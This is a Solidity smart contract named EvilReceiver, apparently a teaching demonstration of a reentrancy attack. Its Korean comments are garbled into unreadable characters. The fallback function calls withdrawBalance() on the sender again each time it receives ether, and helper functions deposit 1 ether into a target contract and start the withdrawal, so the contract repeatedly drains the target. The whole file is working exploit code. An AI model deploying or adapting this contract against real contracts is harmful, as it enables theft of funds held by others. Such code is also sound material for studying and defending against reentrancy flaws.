pragma solidity ^0.4.11;
contract  EvilReceiver {
	
	// ���� ��� ��Ʈ��Ʈ�� ��巹��
	address public target;

	// �޽��� ��¿� �̺�Ʈ
	event MessageLog(string);
	
	// �ܰ� Ȯ�ο� �̺�Ʈ
	event BalanceLog(uint);

	/// ������
	function EvilReceiver(address _target) {
		target = _target;
	}
	
	/// Fallback �Լ�
	function() payable{
		BalanceLog(this.balance);
		
		// VictimBalance�� withdrawBalance�� ȣ��
		if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))) {
			MessageLog("FAIL");
		} else {
			MessageLog("SUCCESS");
		} 
	}

	/// EOA�κ��� �۱ݹ����� ����ϴ� �Լ�
	function addBalance() public payable {
	}

	/// ���ݴ������ �۱��Ҷ� ����ϴ� �Լ�
	function sendEthToTarget() public {
		if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))) {throw;} 
	}

	/// ���ݴ�󿡼� �����Ҷ� ����ϴ� �Լ�
	function withdraw() public {
		if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;} 
	}
}
